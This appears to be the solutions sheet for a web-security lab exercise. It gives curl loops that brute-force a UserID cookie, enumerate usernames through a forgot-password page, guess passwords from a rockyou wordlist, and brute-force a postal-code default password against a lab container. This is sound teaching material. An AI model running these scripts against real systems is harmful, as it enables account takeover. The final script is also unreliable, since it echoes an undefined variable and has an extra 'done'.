Lab 4 Solutions
======

### Challenge 1
During development, a left over account called `test` was not removed. Its password is `test`. This can be discovered using manual or brute force methods.


### Challenge 2
Upon logging in as the `test` user, you'll see a cookie called `UserID` was assigned to you. Brute-force this cookie value to discover a valid `UserID` with value `189`.

You can brute force the cookie value to enumerate valid users using a script like:
```bash
for i in {1..999}; do curl -s -b "UserID=$i" http://container-ip/ | grep -qi Login || echo "$i"; done

```

### Challenge 3
The forgot password page located at `/forgot.php` can be used to enumerate valid usernames. This can be done using a script like:
```bash
for u in `cat usernames.list`; do curl -s -d "username=$u&reset=Reset" http://container-ip/forgot.php | grep -qi 'Invalid username' || echo "$u"; done

```
You should use a wordlist of the top 10,000 common first names, as indicated on the registration page. The user on the system is `aldo`.


### Challenge 4
Now that you know `aldo` is a user on the system, brute-force his credentials on the login page using a script or tool and a list of top passwords (like the `rockyou` wordlist).

You can brute force Aldo's credentials using a script like:
```bash
for p in `cat rock-you.list`; do curl -s -d "username=aldo&password=$p&login=Login" http://container-ip/ | grep -qi 'Login' || echo "$p"; done

```

### Challenges 5
The site's user registration form does not verify if the proposed username is already registered in the system. By registering for a new account and using the username `admin`, we effectively create two users on the system with the same username.


### Challenge 6
The student registration page requires a valid student ID like `100111222`. Once a valid ID is entered, a cookie called `StudentID` is set and the user is given a notice that they should log in using a default password equal to their **Oshawa** postal code.

We know that only a few postal codes are possible, and looking them up online reveals that all Oshawa postal codes are in the range of `L1[G-L]xxx`. To log in as the student, we need to use their Student ID, pass the cookie set by the application, and brute-force their postal code.

This can be done using a script like:
```bash
for a in {G..L}; do
	for b in {0..9}; do
		for c in {A..Z}; do
			for d in {0..9}; do
				curl -s -b 'StudentID=100111222' -d "username=100111222&password=L1$a$b$c$d&login=Login" http://container-ip/ | grep -qi 'Login' || echo "$p"; done
			done
		done
	done
done
```